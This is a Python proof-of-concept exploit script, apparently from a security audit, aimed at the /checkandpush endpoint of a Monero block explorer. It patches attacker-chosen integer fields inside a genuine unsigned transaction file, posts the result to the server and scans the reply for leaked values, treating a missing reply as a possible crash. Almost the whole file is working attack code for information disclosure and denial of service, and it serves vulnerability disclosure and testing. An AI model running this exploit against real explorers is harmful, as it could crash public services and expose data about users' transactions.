#!/usr/bin/env python3
"""
Findings 4, 5 and 24 -- POST /checkandpush (requires --enable-pusher, which every
documented deployment in README.md sets).

This does NOT fabricate a boost archive from scratch. The practical route is to take
a genuine `unsigned_monero_tx` file produced by monero-wallet-cli and patch the
attacker-controlled integer fields in place. That keeps the archive's class-version
header intact, which is the only real gate on this endpoint -- there is no signature
or encryption on this path.

  monero-wallet-cli> transfer <addr> 0.001   # answer "export" / use --unsigned
  # produces ./unsigned_monero_tx

Usage:
  # locate candidate offsets for a 64-bit field holding `value`
  ./f04_f05_f24_pusher.py scan unsigned_monero_tx --value 0
  # patch one and send
  ./f04_f05_f24_pusher.py send unsigned_monero_tx --offset 1234 \
      --index 0xaaaaaaaaaaaaaaaa --host http://127.0.0.1:8081
"""
import argparse, base64, struct, sys, urllib.parse, urllib.request

UNSIGNED_PREFIX = b"Monero unsigned tx set\x03"
SIGNED_PREFIX   = b"Monero signed tx set\x03"

def load(path):
    blob = open(path, "rb").read()
    for p in (UNSIGNED_PREFIX, SIGNED_PREFIX):
        if blob.startswith(p):
            return p, blob[len(p):]
    sys.exit("not an unsigned/signed monero tx file (bad magic)")

def cmd_scan(a):
    prefix, body = load(a.path)
    target = struct.pack("<Q", a.value)
    offs = [i for i in range(0, len(body) - 8) if body[i:i+8] == target]
    print(f"magic={prefix!r} body={len(body)} bytes")
    print(f"offsets holding uint64 {a.value} (candidates for real_output /")
    print(f"real_output_in_tx_index): {offs[:40]}{' ...' if len(offs) > 40 else ''}")
    print("\nreal_output is the ring position of the true spend (0..ring_size-1);")
    print("real_output_in_tx_index is the output's index inside its source tx.")
    print("Patch one, send, and watch the response for finding 4's leaked value.")

def cmd_send(a):
    prefix, body = load(a.path)
    body = bytearray(body)
    body[a.offset:a.offset+8] = struct.pack("<Q", a.index)
    payload = base64.b64encode(prefix + bytes(body)).decode()
    data = urllib.parse.urlencode({"rawtxdata": payload, "action": "check"}).encode()
    req = urllib.request.Request(a.host.rstrip("/") + "/checkandpush", data=data,
                                headers={"Content-Type": "application/x-www-form-urlencoded"})
    print(f"POST {a.host}/checkandpush  ({len(payload)} b64 chars, "
          f"patched offset {a.offset} -> 0x{a.index:016x})")
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            text = r.read().decode(errors="replace")
    except Exception as e:
        print(f"  no response ({e.__class__.__name__}: {e})")
        print("  -> consistent with a crash or an abandoned request")
        return
    # Finding 4's disclosure channel: src/page.h:2932 -> main.cpp:555
    for line in text.splitlines():
        if "does not exist" in line or "Output with amount" in line:
            print("  LEAK:", line.strip())
    print(f"  ({len(text)} bytes of response; grep for 'does not exist')")

p = argparse.ArgumentParser()
sub = p.add_subparsers(dest="cmd", required=True)
s = sub.add_parser("scan");  s.add_argument("path"); s.add_argument("--value", type=lambda x:int(x,0), default=0); s.set_defaults(f=cmd_scan)
s = sub.add_parser("send");  s.add_argument("path"); s.add_argument("--offset", type=int, required=True)
s.add_argument("--index", type=lambda x:int(x,0), required=True)
s.add_argument("--host", default="http://127.0.0.1:8081"); s.set_defaults(f=cmd_send)
a = p.parse_args(); a.f(a)
